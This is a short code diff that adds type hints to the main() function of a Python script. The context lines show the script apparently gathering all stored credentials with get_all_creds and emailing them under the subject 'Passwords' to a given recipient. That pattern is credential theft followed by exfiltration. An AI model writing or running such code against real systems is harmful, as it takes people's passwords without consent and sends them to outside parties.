@@ -7,7 +7,7 @@ from edge_email import write_email
 import argparse
 
 
-async def main(to: str, cc: str = None, headfull=False):
+async def main(to: str, cc: str = None, headfull: bool = False) -> None:
     subject = "Passwords"
     try:
         creds = await get_all_creds(use_b64=True)
